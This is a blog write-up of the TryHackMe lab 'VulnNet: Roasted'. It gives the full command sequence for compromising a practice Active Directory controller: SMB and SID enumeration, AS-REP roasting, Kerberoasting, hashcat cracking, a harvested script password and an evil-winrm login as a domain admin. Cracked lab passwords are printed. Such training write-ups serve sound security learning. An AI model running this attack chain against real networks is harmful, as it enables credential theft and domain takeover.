<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Try Hack Me - VulnNet: Roasted" /><meta name="author" content="h3xit" /><meta property="og:locale" content="en" /><meta name="description" content="Challenge description" /><meta property="og:description" content="Challenge description" /><link rel="canonical" href="https://h3xitsec.github.io/posts/hack-vulnnet-roasted/" /><meta property="og:url" content="https://h3xitsec.github.io/posts/hack-vulnnet-roasted/" /><meta property="og:site_name" content="h3xit‚Äôs ~" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-14T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Try Hack Me - VulnNet: Roasted" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@h3xit" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"h3xit"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://h3xitsec.github.io/posts/hack-vulnnet-roasted/"},"description":"Challenge description","url":"https://h3xitsec.github.io/posts/hack-vulnnet-roasted/","@type":"BlogPosting","headline":"Try Hack Me - VulnNet: Roasted","dateModified":"2022-01-17T19:58:29-05:00","datePublished":"2022-01-14T00:00:00-05:00","@context":"https://schema.org"}</script><title>Try Hack Me - VulnNet: Roasted | h3xit's ~</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="h3xit's ~"><meta name="application-name" content="h3xit's ~"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">h3xit's ~</a></div><div class="site-subtitle font-italic">CTF Writeups and other stuff about my journey into cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/h3xitsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['h3xit','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Try Hack Me - VulnNet: Roasted</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Try Hack Me - VulnNet: Roasted</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/h3xitsec">h3xit</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-01-14 00:00:00 -0500" data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 14, 2022, 12:00 AM -0500" >Jan 14</em> </span> <span> Updated <em class="timeago" date="2022-01-17 19:58:29 -0500 " data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 17, 2022, 7:58 PM -0500" >Jan 17</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2233 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h2 id="challenge-description">Challenge description<a href="#challenge-description" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://tryhackme.com/room/vulnnetroasted">https://tryhackme.com/room/vulnnetroasted</a></p><p><img data-src="/assets/img/thm-roasted/roasted-1.png" alt="description" title="description" data-proofer-ignore></p><h2 id="reconnaissance--enumeration">Reconnaissance / Enumeration<a href="#reconnaissance--enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="port-scanning-and-service-identification">Port scanning and service identification<a href="#port-scanning-and-service-identification" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre>$ rustscan -a $ip -r 1-65535 -- -A -sC    
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
üåçHACK THE PLANETüåç
[...]
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-01-15 03:43:28Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49665/tcp open  unknown       syn-ack
49667/tcp open  unknown       syn-ack
49669/tcp open  unknown       syn-ack
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open  unknown       syn-ack
49689/tcp open  unknown       syn-ack
49705/tcp open  unknown       syn-ack
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10257/tcp): CLEAN (Timeout)
|   Check 2 (port 45437/tcp): CLEAN (Timeout)
|   Check 3 (port 14149/udp): CLEAN (Timeout)
|   Check 4 (port 19319/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-15T03:44:06
|_  start_date: N/A
|_clock-skew: 0s```

$ nmap -n -sV --script "ldap* and not brute" -p 389 $ip -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 04:41 UTC
Nmap scan report for 10.10.229.96
Host is up (0.23s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   &lt;ROOT&gt;
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=vulnnet-rst,DC=local
|       ldapServiceName: vulnnet-rst.local:win-2bo8m1oe1m1$@VULNNET-RST.LOCAL
[...]
|       dsServiceName: CN=NTDS Settings,CN=WIN-2BO8M1OE1M1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=vulnnet-rst,DC=local
|       dnsHostName: WIN-2BO8M1OE1M1.vulnnet-rst.local
|       defaultNamingContext: DC=vulnnet-rst,DC=local
|       currentTime: 20220115044146.0Z
|_      configurationNamingContext: CN=Configuration,DC=vulnnet-rst,DC=local
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
</pre></table></code></div></div><p>Our target is a DC for domain vulnnet-rst.local</p><p>Let‚Äôs move on to services enumeration</p><h3 id="smb-enumeration">SMB Enumeration<a href="#smb-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We start by enumerating Samba shares</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre>$ smbmap -u "guest" -p "" -P 445 -H $ip
[+] IP: 10.10.229.96:445        Name: 10.10.229.96                                      
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share 
SYSVOL                                                  NO ACCESS       Logon server share 
VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing

$ smbclient //$ip/VulnNet-Enterprise-Anonymous
Enter WORKGROUP\h3x's password: 
Try "help" to get a list of possible commands.
smb: \&gt; mask ""
smb: \&gt; recurse ON
smb: \&gt; prompt OFF
smb: \&gt; mget *
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0.4 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)

$ smbclient //$ip/VulnNet-Business-Anonymous
Enter WORKGROUP\h3x's password: 
Try "help" to get a list of possible commands.
smb: \&gt; mask ""
smb: \&gt; recurse ON
smb: \&gt; prompt OFF
smb: \&gt; mget *
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)

$ cat *.txt                    
[...]
Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
[...]
Jack Goldenhand is the person you should reach to for any business unrelated proposals.
[...]
Tony Skid is a core security manager and takes care of internal infrastructure.
[...]
Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
[...]
</pre></table></code></div></div><h3 id="active-directory-enumeration">Active Directory Enumeration<a href="#active-directory-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Text files we got from the open shares gives us the name of some employees. Let‚Äôs try to make ourselves a custom user lists and test them out:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>$ cat &lt;&lt; EOF &gt;&gt; customusers.txt
alexawhitehat
jackgoldenhand
tonyskid
johnnyleet
alexa
awhitehat
alexa.whitehat
jack
jgoldenhand
jack.goldenhand
tony
tskid
tony.skid
johnny
jleet
johnny.leet
whitehat
goldenhand
skid
leet
EOF

$ kerbrute userenum --dc $ip -d $dom ./customusers.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/15/22 - Ronnie Flathers @ropnop

2022/01/15 18:54:22 &gt;  Using KDC(s):
2022/01/15 18:54:22 &gt;   10.10.247.181:88

2022/01/15 18:54:23 &gt;  Done! Tested 20 usernames (0 valid) in 0.692 seconds
</pre></table></code></div></div><p>No luck :(</p><p>Next, we use Impacket‚Äôs lookupsid.py to enumerate SIDs on the domain</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre>$ lookupsid.py anonymous@$ip -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.247.181
[*] StringBinding ncacn_np:10.10.247.181[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

$ cat &lt;&lt; EOF &gt; customusers.txt
a-whitehat
t-skid
j-goldenhand
j-leet
enterprise-core-vn
EOF

$ kerbrute userenum --dc $ip -d $dom ./customusers.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/15/22 - Ronnie Flathers @ropnop

2022/01/15 18:55:29 &gt;  Using KDC(s):
2022/01/15 18:55:29 &gt;   10.10.247.181:88

2022/01/15 18:55:29 &gt;  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local
2022/01/15 18:55:29 &gt;  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local
2022/01/15 18:55:29 &gt;  [+] VALID USERNAME:       enterprise-core-vn@vulnnet-rst.local
2022/01/15 18:55:29 &gt;  [+] VALID USERNAME:       t-skid@vulnnet-rst.local
2022/01/15 18:55:29 &gt;  [+] VALID USERNAME:       j-leet@vulnnet-rst.local
2022/01/15 18:55:29 &gt;  Done! Tested 25 usernames (5 valid) in 0.771 seconds
</pre></table></code></div></div><p>With a list of 5 valid usern, and judging by the name of the challenge, we will now try to roast this machine.</p><h2 id="exploitation--foothold">Exploitation &amp;&amp; Foothold<a href="#exploitation--foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="asreproast">ASREPRoast<a href="#asreproast" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>From our list of users, we‚Äôre gonna try to find an ‚ÄúASREPRoastable‚Äù victim</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>$ GetNPUsers.py -usersfile ./customusers.txt -format hashcat -outputfile hashes.asreproast -dc-ip $ip $dom/      
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set

&amp; cat hashes.asreproast
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:61c29c8ea1dbcec71d69893539932bbda5[...]fd269eab3058
</pre></table></code></div></div><p>We have our ASREPRoastable user, let‚Äôs try and crack the hash</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ hashcat -m 18200 --force -a 0 hashes.asreproast /opt/wordlists/rockyou.txt

$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:61c29c8ea1dbce3[...]15d018b2f3058:tj072889*
</pre></table></code></div></div><p>With that credentials in hand, we should be able to find a Kerberoastable user</p><h3 id="kerberoast">Kerberoast<a href="#kerberoast" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We start by using t-skid‚Äôs credentials to search for a victim</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ GetUserSPNs.py -dc-ip $ip -outputfile ./kerberoast.hashes -usersfile ./customusers.txt $dom/t-skid:tj072889* &amp;&amp; cat kerberoast.hashes
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$enterprise-core-vn*$e7984c52a33e14a7c47dd3e8bf723e46$60c20d75bd82b2b0d1b6d516b06ca[...]2d1104f
</pre></table></code></div></div><p>We can now crack the password</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ hashcat -m 13100 --force -a 0 ./kerberoast.hashes /opt/wordlists/rockyou.txt

$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$enterprise-core-vn*$a7a1[...]60ca62:ry=ibfkfv,s6h,
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let‚Äôs do an authenticated share enumeration</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ smbmap -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -P 445 -H $ip
[+] IP: 10.10.95.159:445        Name: vulnnet-rst.local                                 
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
</pre></table></code></div></div><p>We have read access on netlogon:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ smbclient -U enterprise-core-vn //$ip/NETLOGON
Enter WORKGROUP\enterprise-core-vn's password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Mar 16 23:15:49 2021
  ..                                  D        0  Tue Mar 16 23:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021

                8771839 blocks of size 4096. 4519613 blocks available
smb: \&gt; get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
</pre></table></code></div></div><p>Inside NETLOGON we find a vbs script with a username and password in it. Let‚Äôs try it out</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre>$ cat ResetPassword.vbs                                                  
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName
[...]
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
[...]

$ evil-winrm -i $ip -u a-whitehat -p bNdKVkjv3RR9ht

*Evil-WinRM* PS C:\Users\a-whitehat\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

*Evil-WinRM* PS C:\Users\a-whitehat\Documents&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
